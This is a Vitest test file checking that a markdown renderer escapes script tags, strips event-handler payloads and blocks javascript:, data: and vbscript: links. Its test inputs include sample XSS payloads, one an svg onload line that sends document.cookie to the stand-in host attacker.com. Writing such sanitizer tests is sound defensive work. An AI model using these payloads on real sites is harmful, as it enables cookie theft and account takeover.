import { describe, it, expect } from 'vitest';
import { renderSafeMarkdown, sanitizeUrl, escapeHtml } from '../../src/utils/markdown';

describe('Document Security & XSS Sanitization Invariants', () => {
  it('strictly neutralizes script tags into harmless escaped entities', () => {
    const maliciousInput = '# Heading\n<script>alert("PWNED")</script>';
    const output = renderSafeMarkdown(maliciousInput);

    expect(output).not.toContain('<script>');
    expect(output).not.toContain('</script>');
    expect(output).toContain('&lt;script&gt;alert(&quot;PWNED&quot;)&lt;/script&gt;');
  });

  it('neutralizes inline event handler payloads like img onerror or svg onload', () => {
    const payloads = [
      '<img src=x onerror="alert(1)">',
      '<svg onload="fetch(\'https://attacker.com?c=\' + document.cookie)">',
      '<iframe src="javascript:alert(1)"></iframe>',
    ];

    for (const payload of payloads) {
      const rendered = renderSafeMarkdown(payload);
      expect(rendered).not.toContain('<img');
      expect(rendered).not.toContain('<svg');
      expect(rendered).not.toContain('<iframe');
      expect(rendered).toContain('&lt;');
    }
  });

  it('blocks dangerous URL protocols in markdown hyperlinks', () => {
    const dangerousUrls = [
      'javascript:alert(document.domain)',
      'JAVASCRIPT:alert(1)',
      'javascript&colon;alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'vbscript:msgbox("hello")',
    ];

    for (const url of dangerousUrls) {
      const clean = sanitizeUrl(url);
      expect(clean).toBe('#blocked-unsafe-link');

      const markdown = `[Malicious Link](${url})`;
      const rendered = renderSafeMarkdown(markdown);
      expect(rendered).toContain('href="#blocked-unsafe-link"');
      expect(rendered).not.toContain(url);
    }
  });

  it('preserves valid, legitimate HTTPS and mailto links with noopener rel', () => {
    const validMarkdown = '[Nexus Docs](https://nexus.io/docs)';
    const rendered = renderSafeMarkdown(validMarkdown);

    expect(rendered).toContain('href="https://nexus.io/docs"');
    expect(rendered).toContain('rel="noopener noreferrer"');
    expect(rendered).toContain('target="_blank"');
  });

  it('renders standard markdown structure safely and cleanly', () => {
    const md = '## Architecture\n\n**Reliability** is critical. See `state.ts`.\n\n- Point 1\n- Point 2';
    const rendered = renderSafeMarkdown(md);

    expect(rendered).toContain('<h2');
    expect(rendered).toContain('<strong>Reliability</strong>');
    expect(rendered).toContain('<code');
    expect(rendered).toContain('<li');
  });
});
